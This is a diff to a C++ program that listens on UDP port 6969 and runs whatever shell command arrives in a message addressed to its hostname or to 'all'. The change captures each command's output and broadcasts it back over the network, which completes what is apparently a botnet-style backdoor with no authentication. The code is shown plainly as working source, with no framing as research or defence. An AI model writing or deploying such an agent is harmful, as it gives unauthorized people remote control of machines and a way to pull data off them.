@@ -1,5 +1,6 @@
 #include <fstream>
 #include <cstring>
+#include <netinet/in.h>
 #include <string>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -7,10 +8,9 @@
 #include <vector>
 #include <array>
 #include <memory>
-#include <iostream>
 
 #define PORT 6969
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 256
 
 std::vector<std::string> split(std::string str){
 	std::string word = "";
@@ -71,9 +71,11 @@ int main() {
         if (bytesReceived > 0) {
             if(split((std::string)buffer)[0] == exec("hostname") || split((std::string)buffer)[0] == "all"){
                 if(split((std::string)buffer)[1] == "cmd"){
-                    system(split((std::string)buffer)[2].c_str());
+                    std::string answ = exec(split((std::string)buffer)[2].c_str());
+                    sendto(sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&broadcastAddr, addrLen);
                 }
             }
+            memset(buffer, 0, sizeof(buffer));
         }
     }
 
